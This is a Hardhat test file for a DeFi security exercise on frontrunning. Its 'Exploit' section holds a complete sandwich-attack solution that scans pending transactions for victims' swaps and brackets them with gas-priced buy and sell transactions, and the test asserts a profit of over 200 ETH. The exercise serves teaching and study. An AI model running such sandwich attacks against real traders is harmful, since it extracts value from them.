import {ethers} from 'hardhat';
import {expect} from 'chai';
import {SignerWithAddress} from '@nomicfoundation/hardhat-ethers/signers';
import {Chocolate, Chocolate__factory, IUniswapV2Pair, IWETH9, Sandwich} from '../../typechain-types';
import {BigNumber} from '@ethersproject/bignumber';

const {provider, deployContract, getSigners, parseEther, FunctionFragment} = ethers;

/**
 * @dev run "npx hardhat test test/frontrunning-3/tests.ts"
 */
describe('Frontrunning Attack Exercise 3', function () {
  let deployer: SignerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress, attacker: SignerWithAddress;

  const WETH_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';

  const INITIAL_MINT = parseEther('1000000');
  const INITIAL_LIQUIDITY = parseEther('100000');
  const ETH_IN_LIQUIDITY = parseEther('100');
  const USER1_SWAP = parseEther('120');
  const USER2_SWAP = parseEther('100');

  let chocolate: Chocolate;
  let weth: IWETH9;
  let pair: IUniswapV2Pair;

  let attackerInitialETHBalance: bigint;
  let chocolateFactory: Chocolate__factory;

  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, user1, user2, attacker] = await getSigners();
    let signers = [deployer, user1, user2, attacker];

    // Everyone starts with 300 ETH
    for (let i = 0; i < signers.length; i++) {
      await provider.send('hardhat_setBalance', [
        signers[i].address,
        '0x1043561A8829300000', // 300 ETH
      ]);
    }

    attackerInitialETHBalance = await provider.getBalance(attacker.address);

    weth = (await ethers.getContractAt('src/interfaces/IWETH9.sol:IWETH9', WETH_ADDRESS)) as unknown as IWETH9;
  });

  it('Deployment', async function () {
    chocolateFactory = (await ethers.getContractFactory(
      'src/frontrunning-3/Chocolate.sol:Chocolate',
      deployer,
    )) as Chocolate__factory;
    chocolate = (await chocolateFactory.deploy(INITIAL_MINT)) as Chocolate;
    await provider.send('evm_mine', []);

    const pairAddress = await chocolate.uniswapV2Pair();

    pair = (await ethers.getContractAt('IUniswapV2Pair', pairAddress)) as IUniswapV2Pair;
  });

  it('Deployer adds liquidity', async function () {
    await chocolate.approve(chocolate.target, INITIAL_LIQUIDITY);
    await chocolate.addChocolateLiquidity(INITIAL_LIQUIDITY, {
      value: ETH_IN_LIQUIDITY,
    });
  });

  it('User swap', async function () {
    // User1 swaps 120 ETH to Chocolate
    await chocolate.connect(user1).swapChocolates(weth.target, USER1_SWAP, {
      value: USER1_SWAP,
      gasPrice: 0x4133810a0,
    });

    // User2 swaps 100 ETH to Chocolate
    await chocolate.connect(user2).swapChocolates(weth.target, USER2_SWAP, {
      value: USER2_SWAP,
      gasPrice: 0x4133110a0,
    });
  });

  it('Did someone ask for noise?', async function () {
    for (let i = 0; i < 10; i++) {
      await deployer.sendTransaction({
        to: ethers.Wallet.createRandom().address,
        value: parseEther('0.01'),
      });
    }
  });

  it('Exploit', async function () {
    /** CODE YOUR SOLUTION HERE */
    const sandwichFactory = await ethers.getContractFactory('Sandwich', attacker);
    const sandwichContract = (await sandwichFactory.deploy(WETH_ADDRESS, await chocolate.getAddress())).connect(
      attacker,
    );
    const {transactions: pendingTxs} = await ethers.provider.send('eth_getBlockByNumber', ['pending', true]);
    const swapFuncSig = FunctionFragment.getSelector('swapChocolates', ['address', 'uint256']);

    const swapTxs = pendingTxs
      .filter((tx: any) => tx.input.includes(swapFuncSig))
      .sort((tx1: any, tx2: any) => tx1.gasPrice > tx2.gasPrice);

    // Buy Chocolate before them
    const eth = BigNumber.from(await ethers.provider.getBalance(attacker.address)).sub(ethers.parseEther('1'));

    // Buy transaction (front running)
    await sandwichContract.sandwich(true, {
      value: eth.toBigInt(),
      gasPrice: BigNumber.from(swapTxs[0].gasPrice).add(1).toBigInt(),
    });

    // Sell chocolate after their swaps
    await sandwichContract.sandwich(false, {
      gasPrice: BigNumber.from(swapTxs[1].gasPrice).sub(1).toBigInt(),
    });
  });

  after(async function () {
    // Mine all the transactions
    await provider.send('evm_mine', []);

    // ------- ADDITIONAL LOGS --------
    const block = await ethers.provider.send('eth_getBlockByNumber', ['latest', true]);
    console.log('attacker address: ', attacker.address);
    console.log('all transactions in order of execution: ');
    console.log(block);
    // ---------------------------------

    // Attacker suppose to make more than 110 ETH in profit!
    const attackerETHBalance = await provider.getBalance(attacker.address);
    console.log('attackerETHBalance after: ', attackerETHBalance);
    expect(attackerETHBalance).is.gt(attackerInitialETHBalance + parseEther('200'));
  });
});
